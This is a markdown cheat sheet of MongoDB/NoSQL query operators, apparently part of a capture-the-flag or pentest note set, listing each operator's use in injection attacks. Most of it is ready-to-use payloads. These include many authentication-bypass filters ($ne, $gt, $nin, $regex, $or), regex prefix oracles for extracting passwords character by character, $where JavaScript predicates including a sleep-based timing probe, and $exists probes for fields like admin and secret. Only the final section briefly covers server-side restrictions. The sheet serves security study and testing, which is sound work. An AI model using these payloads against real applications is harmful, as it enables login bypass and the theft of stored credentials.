# NoSQL operators — the full injection surface

## The comparison operators — the filter-benders

| Operator | Semantics | Injection use |
|---|---|---|
| `$ne` | not equal | `{$ne: null}` — field exists — auth-bypass |
| `$eq` | equal | the default — rarely useful |
| `$gt` | greater-than | `{$gt: ""}` — any non-empty — auth-bypass |
| `$gte` | greater-or-equal | `{$gte: ""}` |
| `$lt` | less-than | range-oracle — `{$lt: "m"}` — is char < m |
| `$lte` | less-or-equal | range-oracle |
| `$in` | in-array | `{$in: [a,b,c]}` — any-of |
| `$nin` | not-in | `{$nin: []}` — always true |
| `$regex` | regex-match | `{$regex: "^a"}` — prefix-oracle — extraction |
| `$exists` | field-exists | `{$exists: true}` — field-discovery |

## The `$ne` family — the auth-bypass core

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
```

`$ne: null` = "exists and not null" — matches any doc — the classic
auth-bypass — `auth-bypass.md`.

Variants:

```json
{"user": {"$ne": "nosuchuser"}, "pass": {"$ne": "x"}}
{"user": {"$ne": ""}, "pass": {"$ne": ""}}
{"user": {"$ne": 0}, "pass": {"$ne": 0}}
{"user": {"$ne": []}, "pass": {"$ne": []}}
{"user": {"$ne": false}, "pass": {"$ne": false}}
{"user": {"$nin": []}, "pass": {"$nin": []}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$gte": ""}, "pass": {"$gte": ""}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$regex": "^"}, "pass": {"$regex": "^"}}
{"user": {"$exists": true}, "pass": {"$exists": true}}
{"user": {"$not": {"$eq": "nosuch"}}, "pass": {"$not": {"$eq": "x"}}}
```

## The `$regex` family — the extraction oracle

```json
{"pass": {"$regex": "^a"}}     — does pass start with a?
{"pass": {"$regex": "^ab"}}    — start with ab?
{"pass": {"$regex": "a$"}}     — end with a?
{"pass": {"$regex": "^flag"}}  — start with flag?
{"pass": {"$regex": "^flag\\{"}}  — the flag-prefix
```

`^` anchors to start — char-by-char extraction — `extraction.md`.

## The `$where` — the JavaScript predicate

```json
{"user": {"$where": "this.user == 'admin'"}}
{"user": {"$where": "1==1"}}
{"user": {"$where": "sleep(5000) || true"}}
{"user": {"$where": "this.pass.match(/^a/)"}}
```

`$where` runs JS server-side — requires `enableJs` on the server —
disabled by default on Atlas/most modern — `operators-js.md`.

## The `$expr` — the aggregation-expression in find

```json
{"$expr": {"$eq": ["$user", "admin"]}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
```

`$expr` uses aggregation-operators inside `find()` — `$regexMatch` is
an alternative to `$regex` — `aggregation.md`.

## The `$jsonSchema` — the schema-injection

```json
{"$jsonSchema": {"required": ["admin"]}}
```

`$jsonSchema` filters by schema — rarely injectable but a fingerprint.

## The logical operators — `$and`/`$or`/`$nor`/`$not`

```json
{"$or": [{"user": "admin"}, {"user": "x"}]}
{"$or": [{"_id": {"$exists": true}}, {}]}
{"$and": [{"user": "admin"}, {"pass": {"$regex": "^a"}}]}
{"$nor": [{"user": "nosuch"}]}
{"$not": {"$eq": "nosuch"}}
```

`$or` — either-branch-true — the auth-bypass the `$ne` doesn't reach —
`auth-bypass.md`.

## The field-existence — `$exists` for field-discovery

```json
{"admin": {"$exists": true}}
{"role": {"$exists": true}}
{"isAdmin": {"$exists": true}}
{"flag": {"$exists": true}}
{"secret": {"$exists": true}}
```

`$exists: true` — does the doc carry `admin`/`role`/`isAdmin`/`flag`/
`secret`? — field-discovery — `extraction.md`.

## The `$type` — the type-check oracle

```json
{"pass": {"$type": "string"}}
{"pass": {"$type": 2}}
```

`$type` — is the field a string? — a type-oracle — `extraction.md`.

## The `$size` — the array-length oracle

```json
{"tags": {"$size": 3}}
```

`$size` — the array's length — an array-field discovery.

## The `$all` — the array-contains-all

```json
{"tags": {"$all": ["admin"]}}
```

`$all` — the array contains all the listed — an array-content oracle.

## The `$elemMatch` — the array-element filter

```json
{"items": {"$elemMatch": {"price": {"$gt": 100}}}}
```

`$elemMatch` — filter on an array-element's fields — the subdoc-injection.

## The `$mod` — the modulo oracle

```json
{"id": {"$mod": [2, 0]}}
```

`$mod [divisor, remainder]` — `id % 2 == 0` — an arithmetic oracle.

## The `$text`/`$search` — the text-search

```json
{"$text": {"$search": "admin"}}
```

`$text` — needs a text-index — a search-injection.

## The `$comment` — the free-text

```json
{"user": "admin", "$comment": "probe"}
```

`$comment` attaches a comment — the log-fingerprint.

## The operator-set — the banned/restricted

Server-side restrictions:

- `enableJs: false` — `$where`/`$accumulator`/`$function` dead
- `sanitizeFilter` (mongoose) — strips `$`-keys
- a custom whitelist — only named operators allowed

The denylist (`sanitizeFilter`) vs the whitelist — `filter-bypass.md`.
